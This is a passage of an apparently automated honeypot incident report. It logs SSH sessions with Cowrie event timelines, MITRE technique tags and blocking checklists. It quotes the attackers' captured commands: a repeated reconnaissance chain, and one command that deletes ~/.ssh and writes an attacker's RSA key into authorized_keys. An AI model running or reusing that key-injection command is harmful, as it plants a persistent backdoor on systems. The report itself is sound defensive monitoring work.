| **Commands Executed** | `export PATH=/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin:$PATH; uname=$(uname -s -v -n -m 2>/dev/null || /bin/uname -s -v -n -m 2>/dev/null || /usr/bin/uname -s -v -n -m 2>/dev/null || busybox uname -s -v -n -m 2>/dev/null || ( [ -f /proc/version ] && head -1 /proc/version | cut -d' ' -f1 ) || ( [ -f /etc/os-release ] && grep '^ID=' /etc/os-release | cut -d= -f2 | tr -d '"' ) || echo ""); arch=$(uname -m 2>/dev/null || /bin/uname -m 2>/dev/null || /usr/bin/uname -m 2>/dev/null || busybox una, uname -s -v -n -m 2 > /dev/null, /bin/uname -s -v -n -m 2 > /dev/null, /usr/bin/uname -s -v -n -m 2 > /dev/null, busybox uname -s -v -n -m 2 > /dev/null` |
| **TTPs (MITRE)** | T1059.004 · T1078 · T1083 · T1222.002 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-10 11:20:53` | `cowrie.session.connect` |
| `2026-07-10 11:20:53` | `cowrie.client.version` |
| `2026-07-10 11:20:53` | `cowrie.client.kex` |
| `2026-07-10 11:20:54` | `cowrie.login.success` |
| `2026-07-10 11:20:55` | `cowrie.session.params` |
| `2026-07-10 11:20:55` | `cowrie.command.input` |
| `2026-07-10 11:20:55` | `cowrie.command.input` |
| `2026-07-10 11:20:55` | `cowrie.command.input` |
| `2026-07-10 11:20:55` | `cowrie.command.input` |
| `2026-07-10 11:20:55` | `cowrie.command.input` |
| `2026-07-10 11:20:55` | `cowrie.command.success` |
| `2026-07-10 11:20:55` | `cowrie.command.input` |
| `2026-07-10 11:20:55` | `cowrie.command.input` |
| `2026-07-10 11:20:55` | `cowrie.command.input` |
| `2026-07-10 11:20:55` | `cowrie.command.input` |
| `2026-07-10 11:20:56` | `cowrie.log.closed` |
| `2026-07-10 11:20:56` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `91.92.40[.]204` to AbuseIPDB if not already reported
- [ ] Block `91.92.40[.]204` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-8a7a67d28fae

| Field | Detail |
|---|---|
| **Source IP** | `91.92.40[.]204` |
| **First Seen** | 2026-07-10 11:22 |
| **Last Seen** | 2026-07-10 11:22 |
| **Session Duration** | 3s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `export PATH=/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin:$PATH; uname=$(uname -s -v -n -m 2>/dev/null || /bin/uname -s -v -n -m 2>/dev/null || /usr/bin/uname -s -v -n -m 2>/dev/null || busybox uname -s -v -n -m 2>/dev/null || ( [ -f /proc/version ] && head -1 /proc/version | cut -d' ' -f1 ) || ( [ -f /etc/os-release ] && grep '^ID=' /etc/os-release | cut -d= -f2 | tr -d '"' ) || echo ""); arch=$(uname -m 2>/dev/null || /bin/uname -m 2>/dev/null || /usr/bin/uname -m 2>/dev/null || busybox una, uname -s -v -n -m 2 > /dev/null, /bin/uname -s -v -n -m 2 > /dev/null, /usr/bin/uname -s -v -n -m 2 > /dev/null, busybox uname -s -v -n -m 2 > /dev/null` |
| **TTPs (MITRE)** | T1059.004 · T1078 · T1083 · T1222.002 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-10 11:22:06` | `cowrie.session.connect` |
| `2026-07-10 11:22:06` | `cowrie.client.version` |
| `2026-07-10 11:22:06` | `cowrie.client.kex` |
| `2026-07-10 11:22:08` | `cowrie.login.success` |
| `2026-07-10 11:22:09` | `cowrie.session.params` |
| `2026-07-10 11:22:09` | `cowrie.command.input` |
| `2026-07-10 11:22:09` | `cowrie.command.input` |
| `2026-07-10 11:22:09` | `cowrie.command.input` |
| `2026-07-10 11:22:09` | `cowrie.command.input` |
| `2026-07-10 11:22:09` | `cowrie.command.input` |
| `2026-07-10 11:22:09` | `cowrie.command.success` |
| `2026-07-10 11:22:09` | `cowrie.command.input` |
| `2026-07-10 11:22:09` | `cowrie.command.input` |
| `2026-07-10 11:22:09` | `cowrie.command.input` |
| `2026-07-10 11:22:09` | `cowrie.command.input` |
| `2026-07-10 11:22:10` | `cowrie.log.closed` |
| `2026-07-10 11:22:10` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `91.92.40[.]204` to AbuseIPDB if not already reported
- [ ] Block `91.92.40[.]204` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-65ce485e60aa

| Field | Detail |
|---|---|
| **Source IP** | `45.198.224[.]120` |
| **First Seen** | 2026-07-10 11:22 |
| **Last Seen** | 2026-07-10 11:22 |
| **Session Duration** | 13s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `echo OK` |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-10 11:22:35` | `cowrie.session.connect` |
| `2026-07-10 11:22:37` | `cowrie.client.version` |
| `2026-07-10 11:22:37` | `cowrie.client.kex` |
| `2026-07-10 11:22:43` | `cowrie.login.success` |
| `2026-07-10 11:22:46` | `cowrie.session.params` |
| `2026-07-10 11:22:46` | `cowrie.command.input` |
| `2026-07-10 11:22:48` | `cowrie.log.closed` |
| `2026-07-10 11:22:48` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `45.198.224[.]120` to AbuseIPDB if not already reported
- [ ] Block `45.198.224[.]120` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-beb1593f91dd

| Field | Detail |
|---|---|
| **Source IP** | `91.92.40[.]204` |
| **First Seen** | 2026-07-10 11:23 |
| **Last Seen** | 2026-07-10 11:23 |
| **Session Duration** | 3s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `export PATH=/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin:$PATH; uname=$(uname -s -v -n -m 2>/dev/null || /bin/uname -s -v -n -m 2>/dev/null || /usr/bin/uname -s -v -n -m 2>/dev/null || busybox uname -s -v -n -m 2>/dev/null || ( [ -f /proc/version ] && head -1 /proc/version | cut -d' ' -f1 ) || ( [ -f /etc/os-release ] && grep '^ID=' /etc/os-release | cut -d= -f2 | tr -d '"' ) || echo ""); arch=$(uname -m 2>/dev/null || /bin/uname -m 2>/dev/null || /usr/bin/uname -m 2>/dev/null || busybox una, uname -s -v -n -m 2 > /dev/null, /bin/uname -s -v -n -m 2 > /dev/null, /usr/bin/uname -s -v -n -m 2 > /dev/null, busybox uname -s -v -n -m 2 > /dev/null` |
| **TTPs (MITRE)** | T1059.004 · T1078 · T1083 · T1222.002 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-10 11:23:20` | `cowrie.session.connect` |
| `2026-07-10 11:23:20` | `cowrie.client.version` |
| `2026-07-10 11:23:20` | `cowrie.client.kex` |
| `2026-07-10 11:23:21` | `cowrie.login.success` |
| `2026-07-10 11:23:23` | `cowrie.session.params` |
| `2026-07-10 11:23:23` | `cowrie.command.input` |
| `2026-07-10 11:23:23` | `cowrie.command.input` |
| `2026-07-10 11:23:23` | `cowrie.command.input` |
| `2026-07-10 11:23:23` | `cowrie.command.input` |
| `2026-07-10 11:23:23` | `cowrie.command.input` |
| `2026-07-10 11:23:23` | `cowrie.command.success` |
| `2026-07-10 11:23:23` | `cowrie.command.input` |
| `2026-07-10 11:23:23` | `cowrie.command.input` |
| `2026-07-10 11:23:23` | `cowrie.command.input` |
| `2026-07-10 11:23:23` | `cowrie.command.input` |
| `2026-07-10 11:23:23` | `cowrie.log.closed` |
| `2026-07-10 11:23:23` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `91.92.40[.]204` to AbuseIPDB if not already reported
- [ ] Block `91.92.40[.]204` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-60bf73b6318e

| Field | Detail |
|---|---|
| **Source IP** | `91.92.40[.]204` |
| **First Seen** | 2026-07-10 11:24 |
| **Last Seen** | 2026-07-10 11:24 |
| **Session Duration** | 3s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `export PATH=/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin:$PATH; uname=$(uname -s -v -n -m 2>/dev/null || /bin/uname -s -v -n -m 2>/dev/null || /usr/bin/uname -s -v -n -m 2>/dev/null || busybox uname -s -v -n -m 2>/dev/null || ( [ -f /proc/version ] && head -1 /proc/version | cut -d' ' -f1 ) || ( [ -f /etc/os-release ] && grep '^ID=' /etc/os-release | cut -d= -f2 | tr -d '"' ) || echo ""); arch=$(uname -m 2>/dev/null || /bin/uname -m 2>/dev/null || /usr/bin/uname -m 2>/dev/null || busybox una, uname -s -v -n -m 2 > /dev/null, /bin/uname -s -v -n -m 2 > /dev/null, /usr/bin/uname -s -v -n -m 2 > /dev/null, busybox uname -s -v -n -m 2 > /dev/null` |
| **TTPs (MITRE)** | T1059.004 · T1078 · T1083 · T1222.002 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-10 11:24:34` | `cowrie.session.connect` |
| `2026-07-10 11:24:34` | `cowrie.client.version` |
| `2026-07-10 11:24:34` | `cowrie.client.kex` |
| `2026-07-10 11:24:35` | `cowrie.login.success` |
| `2026-07-10 11:24:37` | `cowrie.session.params` |
| `2026-07-10 11:24:37` | `cowrie.command.input` |
| `2026-07-10 11:24:37` | `cowrie.command.input` |
| `2026-07-10 11:24:37` | `cowrie.command.input` |
| `2026-07-10 11:24:37` | `cowrie.command.input` |
| `2026-07-10 11:24:37` | `cowrie.command.input` |
| `2026-07-10 11:24:37` | `cowrie.command.success` |
| `2026-07-10 11:24:37` | `cowrie.command.input` |
| `2026-07-10 11:24:37` | `cowrie.command.input` |
| `2026-07-10 11:24:37` | `cowrie.command.input` |
| `2026-07-10 11:24:37` | `cowrie.command.input` |
| `2026-07-10 11:24:37` | `cowrie.log.closed` |
| `2026-07-10 11:24:37` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `91.92.40[.]204` to AbuseIPDB if not already reported
- [ ] Block `91.92.40[.]204` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-04763e7a90f2

| Field | Detail |
|---|---|
| **Source IP** | `2.26.230[.]127` |
| **First Seen** | 2026-07-10 11:25 |
| **Last Seen** | 2026-07-10 11:25 |
| **Session Duration** | 3s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `cd ~; chattr -ia .ssh; lockr -ia .ssh, cd ~ && rm -rf .ssh && mkdir .ssh && echo "ssh-rsa AAAAB3NzaC1yc2EAAAABJQAAAQEArDp4cun2lhr4KUhBGE7VvAcwdli2a8dbnrTOrbMz1+5O73fcBOx8NVbUT0bUanUV9tJ2/9p7+vD0EpZ3Tz/+0kX34uAx1RV/75GVOmNx+9EuWOnvNoaJe0QXxziIg9eLBHpgLMuakb5+BgTFB+rKJAw9u9FSTDengvS8hX1kNFS4Mjux0hJOK8rvcEmPecjdySYMb66nylAKGwCEE6WEQHmd1mUPgHwGQ0hWCwsQk13yCGPK5w6hYp5zYkFnvlC8hGmd4Ww+u97k6pfTGTUbJk14ujvcD9iUKQTTWYYjIIu5PmUux5bsZ0R4WFwdIe6+i6rBLAsPKgAySVKPRK+oRw== mdrfckr">>.ssh/authorized_keys && chmod -R go= ~/.ssh && cd ~` |
| **Download Attempts** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 |
| **TTPs (MITRE)** | T1021.004 · T1078 · T1105 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-10 11:25:20` | `cowrie.session.connect` |
| `2026-07-10 11:25:20` | `cowrie.client.version` |
| `2026-07-10 11:25:21` | `cowrie.client.kex` |
| `2026-07-10 11:25:21` | `cowrie.login.success` |
| `2026-07-10 11:25:22` | `cowrie.session.params` |
| `2026-07-10 11:25:22` | `cowrie.command.input` |
| `2026-07-10 11:25:22` | `cowrie.command.failed` |
| `2026-07-10 11:25:22` | `cowrie.log.closed` |
| `2026-07-10 11:25:23` | `cowrie.session.params` |
| `2026-07-10 11:25:23` | `cowrie.command.input` |
| `2026-07-10 11:25:23` | `cowrie.session.file_download` |
| `2026-07-10 11:25:23` | `cowrie.log.closed` |
| `2026-07-10 11:25:24` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `2.26.230[.]127` to AbuseIPDB if not already reported
- [ ] Block `2.26.230[.]127` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Submit download hash(es) to VirusTotal
- [ ] Run Tool 31 malware analyzer on captured payload(s)
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-b36d5c2d5176

| Field | Detail |
|---|---|
| **Source IP** | `2.26.230[.]127` |
| **First Seen** | 2026-07-10 11:25 |
| **Last Seen** | 2026-07-10 11:25 |
| **Session Duration** | 0s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-10 11:25:23` | `cowrie.session.connect` |
| `2026-07-10 11:25:23` | `cowrie.client.version` |
| `2026-07-10 11:25:23` | `cowrie.client.kex` |
| `2026-07-10 11:25:23` | `cowrie.login.success` |
| `2026-07-10 11:25:23` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `2.26.230[.]127` to AbuseIPDB if not already reported
- [ ] Block `2.26.230[.]127` at perimeter firewall / security group
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-f49de6482c79

| Field | Detail |
|---|---|
| **Source IP** | `2.26.230[.]127` |
| **First Seen** | 2026-07-10 11:25 |
| **Last Seen** | 2026-07-10 11:25 |
| **Session Duration** | 0s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-10 11:25:24` | `cowrie.session.connect` |
| `2026-07-10 11:25:24` | `cowrie.client.version` |
| `2026-07-10 11:25:24` | `cowrie.client.kex` |
| `2026-07-10 11:25:24` | `cowrie.login.success` |
| `2026-07-10 11:25:24` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `2.26.230[.]127` to AbuseIPDB if not already reported
- [ ] Block `2.26.230[.]127` at perimeter firewall / security group
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-6453874f01d5

| Field | Detail |
|---|---|
| **Source IP** | `91.92.40[.]204` |
| **First Seen** | 2026-07-10 11:25 |
| **Last Seen** | 2026-07-10 11:25 |
| **Session Duration** | 3s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `export PATH=/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin:$PATH; uname=$(uname -s -v -n -m 2>/dev/null || /bin/uname -s -v -n -m 2>/dev/null || /usr/bin/uname -s -v -n -m 2>/dev/null || busybox uname -s -v -n -m 2>/dev/null || ( [ -f /proc/version ] && head -1 /proc/version | cut -d' ' -f1 ) || ( [ -f /etc/os-release ] && grep '^ID=' /etc/os-release | cut -d= -f2 | tr -d '"' ) || echo ""); arch=$(uname -m 2>/dev/null || /bin/uname -m 2>/dev/null || /usr/bin/uname -m 2>/dev/null || busybox una, uname -s -v -n -m 2 > /dev/null, /bin/uname -s -v -n -m 2 > /dev/null, /usr/bin/uname -s -v -n -m 2 > /dev/null, busybox uname -s -v -n -m 2 > /dev/null` |
| **TTPs (MITRE)** | T1059.004 · T1078 · T1083 · T1222.002 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-10 11:25:48` | `cowrie.session.connect` |
| `2026-07-10 11:25:49` | `cowrie.client.version` |
| `2026-07-10 11:25:49` | `cowrie.client.kex` |
| `2026-07-10 11:25:50` | `cowrie.login.success` |
| `2026-07-10 11:25:51` | `cowrie.session.params` |
| `2026-07-10 11:25:51` | `cowrie.command.input` |
| `2026-07-10 11:25:51` | `cowrie.command.input` |
| `2026-07-10 11:25:51` | `cowrie.command.input` |
| `2026-07-10 11:25:51` | `cowrie.command.input` |
| `2026-07-10 11:25:51` | `cowrie.command.input` |
| `2026-07-10 11:25:51` | `cowrie.command.success` |
| `2026-07-10 11:25:51` | `cowrie.command.input` |
| `2026-07-10 11:25:51` | `cowrie.command.input` |
| `2026-07-10 11:25:51` | `cowrie.command.input` |
| `2026-07-10 11:25:51` | `cowrie.command.input` |
| `2026-07-10 11:25:51` | `cowrie.log.closed` |
| `2026-07-10 11:25:51` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `91.92.40[.]204` to AbuseIPDB if not already reported
- [ ] Block `91.92.40[.]204` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-260580245b31

| Field | Detail |
|---|---|
| **Source IP** | `91.92.40[.]204` |
| **First Seen** | 2026-07-10 11:27 |
| **Last Seen** | 2026-07-10 11:27 |
| **Session Duration** | 3s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `export PATH=/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin:$PATH; uname=$(uname -s -v -n -m 2>/dev/null || /bin/uname -s -v -n -m 2>/dev/null || /usr/bin/uname -s -v -n -m 2>/dev/null || busybox uname -s -v -n -m 2>/dev/null || ( [ -f /proc/version ] && head -1 /proc/version | cut -d' ' -f1 ) || ( [ -f /etc/os-release ] && grep '^ID=' /etc/os-release | cut -d= -f2 | tr -d '"' ) || echo ""); arch=$(uname -m 2>/dev/null || /bin/uname -m 2>/dev/null || /usr/bin/uname -m 2>/dev/null || busybox una, uname -s -v -n -m 2 > /dev/null, /bin/uname -s -v -n -m 2 > /dev/null, /usr/bin/uname -s -v -n -m 2 > /dev/null, busybox uname -s -v -n -m 2 > /dev/null` |
| **TTPs (MITRE)** | T1059.004 · T1078 · T1083 · T1222.002 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-10 11:27:05` | `cowrie.session.connect` |
| `2026-07-10 11:27:05` | `cowrie.client.version` |
| `2026-07-10 11:27:05` | `cowrie.client.kex` |
| `2026-07-10 11:27:06` | `cowrie.login.success` |
| `2026-07-10 11:27:07` | `cowrie.session.params` |
| `2026-07-10 11:27:07` | `cowrie.command.input` |
| `2026-07-10 11:27:07` | `cowrie.command.input` |
| `2026-07-10 11:27:07` | `cowrie.command.input` |
| `2026-07-10 11:27:07` | `cowrie.command.input` |
| `2026-07-10 11:27:07` | `cowrie.command.input` |
| `2026-07-10 11:27:07` | `cowrie.command.success` |
| `2026-07-10 11:27:07` | `cowrie.command.input` |
| `2026-07-10 11:27:07` | `cowrie.command.input` |
| `2026-07-10 11:27:07` | `cowrie.command.input` |
| `2026-07-10 11:27:07` | `cowrie.command.input` |
| `2026-07-10 11:27:07` | `cowrie.log.closed` |
| `2026-07-10 11:27:08` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `91.92.40[.]204` to AbuseIPDB if not already reported
- [ ] Block `91.92.40[.]204` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-fc248d424869

| Field | Detail |
|---|---|
| **Source IP** | `91.92.40[.]204` |
| **First Seen** | 2026-07-10 11:28 |
| **Last Seen** | 2026-07-10 11:28 |
| **Session Duration** | 2s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `export PATH=/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin:$PATH; uname=$(uname -s -v -n -m 2>/dev/null || /bin/uname -s -v -n -m 2>/dev/null || /usr/bin/uname -s -v -n -m 2>/dev/null || busybox uname -s -v -n -m 2>/dev/null || ( [ -f /proc/version ] && head -1 /proc/version | cut -d' ' -f1 ) || ( [ -f /etc/os-release ] && grep '^ID=' /etc/os-release | cut -d= -f2 | tr -d '"' ) || echo ""); arch=$(uname -m 2>/dev/null || /bin/uname -m 2>/dev/null || /usr/bin/uname -m 2>/dev/null || busybox una, uname -s -v -n -m 2 > /dev/null, /bin/uname -s -v -n -m 2 > /dev/null, /usr/bin/uname -s -v -n -m 2 > /dev/null, busybox uname -s -v -n -m 2 > /dev/null` |
| **TTPs (MITRE)** | T1059.004 · T1078 · T1083 · T1222.002 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-10 11:28:21` | `cowrie.session.connect` |
| `2026-07-10 11:28:21` | `cowrie.client.version` |
| `2026-07-10 11:28:21` | `cowrie.client.kex` |
| `2026-07-10 11:28:22` | `cowrie.login.success` |
| `2026-07-10 11:28:23` | `cowrie.session.params` |
| `2026-07-10 11:28:23` | `cowrie.command.input` |
| `2026-07-10 11:28:23` | `cowrie.command.input` |
| `2026-07-10 11:28:23` | `cowrie.command.input` |
| `2026-07-10 11:28:23` | `cowrie.command.input` |
| `2026-07-10 11:28:23` | `cowrie.command.input` |
| `2026-07-10 11:28:23` | `cowrie.command.success` |
| `2026-07-10 11:28:23` | `cowrie.command.input` |
| `2026-07-10 11:28:23` | `cowrie.command.input` |
| `2026-07-10 11:28:23` | `cowrie.command.input` |
| `2026-07-10 11:28:23` | `cowrie.command.input` |
| `2026-07-10 11:28:23` | `cowrie.log.closed` |
| `2026-07-10 11:28:24` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `91.92.40[.]204` to AbuseIPDB if not already reported
- [ ] Block `91.92.40[.]204` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-0ef986442762

| Field | Detail |
|---|---|
| **Source IP** | `91.92.40[.]204` |
| **First Seen** | 2026-07-10 11:29 |
| **Last Seen** | 2026-07-10 11:29 |
| **Session Duration** | 2s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `export PATH=/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin:$PATH; uname=$(uname -s -v -n -m 2>/dev/null || /bin/uname -s -v -n -m 2>/dev/null || /usr/bin/uname -s -v -n -m 2>/dev/null || busybox uname -s -v -n -m 2>/dev/null || ( [ -f /proc/version ] && head -1 /proc/version | cut -d' ' -f1 ) || ( [ -f /etc/os-release ] && grep '^ID=' /etc/os-release | cut -d= -f2 | tr -d '"' ) || echo ""); arch=$(uname -m 2>/dev/null || /bin/uname -m 2>/dev/null || /usr/bin/uname -m 2>/dev/null || busybox una, uname -s -v -n -m 2 > /dev/null, /bin/uname -s -v -n -m 2 > /dev/null, /usr/bin/uname -s -v -n -m 2 > /dev/null, busybox uname -s -v -n -m 2 > /dev/null` |
| **TTPs (MITRE)** | T1059.004 · T1078 · T1083 · T1222.002 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-10 11:29:37` | `cowrie.session.connect` |
| `2026-07-10 11:29:37` | `cowrie.client.version` |
| `2026-07-10 11:29:37` | `cowrie.client.kex` |
| `2026-07-10 11:29:38` | `cowrie.login.success` |
| `2026-07-10 11:29:39` | `cowrie.session.params` |
| `2026-07-10 11:29:39` | `cowrie.command.input` |
| `2026-07-10 11:29:39` | `cowrie.command.input` |
| `2026-07-10 11:29:39` | `cowrie.command.input` |
| `2026-07-10 11:29:39` | `cowrie.command.input` |
| `2026-07-10 11:29:39` | `cowrie.command.input` |
| `2026-07-10 11:29:39` | `cowrie.command.success` |
| `2026-07-10 11:29:39` | `cowrie.command.input` |
| `2026-07-10 11:29:39` | `cowrie.command.input` |
| `2026-07-10 11:29:39` | `cowrie.command.input` |
| `2026-07-10 11:29:39` | `cowrie.command.input` |
| `2026-07-10 11:29:39` | `cowrie.log.closed` |
| `2026-07-10 11:29:39` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `91.92.40[.]204` to AbuseIPDB if not already reported
- [ ] Block `91.92.40[.]204` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-2581e77cf934

| Field | Detail |
|---|---|
| **Source IP** | `91.92.40[.]204` |
| **First Seen** | 2026-07-10 11:30 |
| **Last Seen** | 2026-07-10 11:30 |
| **Session Duration** | 2s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `export PATH=/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin:$PATH; uname=$(uname -s -v -n -m 2>/dev/null || /bin/uname -s -v -n -m 2>/dev/null || /usr/bin/uname -s -v -n -m 2>/dev/null || busybox uname -s -v -n -m 2>/dev/null || ( [ -f /proc/version ] && head -1 /proc/version | cut -d' ' -f1 ) || ( [ -f /etc/os-release ] && grep '^ID=' /etc/os-release | cut -d= -f2 | tr -d '"' ) || echo ""); arch=$(uname -m 2>/dev/null || /bin/uname -m 2>/dev/null || /usr/bin/uname -m 2>/dev/null || busybox una, uname -s -v -n -m 2 > /dev/null, /bin/uname -s -v -n -m 2 > /dev/null, /usr/bin/uname -s -v -n -m 2 > /dev/null, busybox uname -s -v -n -m 2 > /dev/null` |
| **TTPs (MITRE)** | T1059.004 · T1078 · T1083 · T1222.002 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-10 11:30:54` | `cowrie.session.connect` |
| `2026-07-10 11:30:55` | `cowrie.client.version` |
| `2026-07-10 11:30:55` | `cowrie.client.kex` |
| `2026-07-10 11:30:55` | `cowrie.login.success` |
| `2026-07-10 11:30:56` | `cowrie.session.params` |
| `2026-07-10 11:30:56` | `cowrie.command.input` |
| `2026-07-10 11:30:56` | `cowrie.command.input` |
| `2026-07-10 11:30:56` | `cowrie.command.input` |
| `2026-07-10 11:30:56` | `cowrie.command.input` |
| `2026-07-10 11:30:56` | `cowrie.command.input` |
| `2026-07-10 11:30:56` | `cowrie.command.success` |
| `2026-07-10 11:30:56` | `cowrie.command.input` |
| `2026-07-10 11:30:56` | `cowrie.command.input` |
| `2026-07-10 11:30:56` | `cowrie.command.input` |
| `2026-07-10 11:30:56` | `cowrie.command.input` |
| `2026-07-10 11:30:56` | `cowrie.log.closed` |
| `2026-07-10 11:30:57` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `91.92.40[.]204` to AbuseIPDB if not already reported
- [ ] Block `91.92.40[.]204` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-bd01178afcb6

| Field | Detail |
|---|---|
| **Source IP** | `91.92.40[.]204` |
| **First Seen** | 2026-07-10 11:32 |
| **Last Seen** | 2026-07-10 11:32 |
| **Session Duration** | 3s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `export PATH=/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin:$PATH; uname=$(uname -s -v -n -m 2>/dev/null || /bin/uname -s -v -n -m 2>/dev/null || /usr/bin/uname -s -v -n -m 2>/dev/null || busybox uname -s -v -n -m 2>/dev/null || ( [ -f /proc/version ] && head -1 /proc/version | cut -d' ' -f1 ) || ( [ -f /etc/os-release ] && grep '^ID=' /etc/os-release | cut -d= -f2 | tr -d '"' ) || echo ""); arch=$(uname -m 2>/dev/null || /bin/uname -m 2>/dev/null || /usr/bin/uname -m 2>/dev/null || busybox una, uname -s -v -n -m 2 > /dev/null, /bin/uname -s -v -n -m 2 > /dev/null, /usr/bin/uname -s -v -n -m 2 > /dev/null, busybox uname -s -v -n -m 2 > /dev/null` |
| **TTPs (MITRE)** | T1059.004 · T1078 · T1083 · T1222.002 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-10 11:32:12` | `cowrie.session.connect` |
| `2026-07-10 11:32:12` | `cowrie.client.version` |
| `2026-07-10 11:32:12` | `cowrie.client.kex` |
| `2026-07-10 11:32:13` | `cowrie.login.success` |
| `2026-07-10 11:32:14` | `cowrie.session.params` |
| `2026-07-10 11:32:14` | `cowrie.command.input` |
| `2026-07-10 11:32:14` | `cowrie.command.input` |
| `2026-07-10 11:32:14` | `cowrie.command.input` |
| `2026-07-10 11:32:14` | `cowrie.command.input` |
| `2026-07-10 11:32:14` | `cowrie.command.input` |
| `2026-07-10 11:32:14` | `cowrie.command.success` |
| `2026-07-10 11:32:14` | `cowrie.command.input` |
| `2026-07-10 11:32:14` | `cowrie.command.input` |
| `2026-07-10 11:32:14` | `cowrie.command.input` |
| `2026-07-10 11:32:14` | `cowrie.command.input` |
| `2026-07-10 11:32:15` | `cowrie.log.closed` |
| `2026-07-10 11:32:15` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `91.92.40[.]204` to AbuseIPDB if not already reported
- [ ] Block `91.92.40[.]204` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

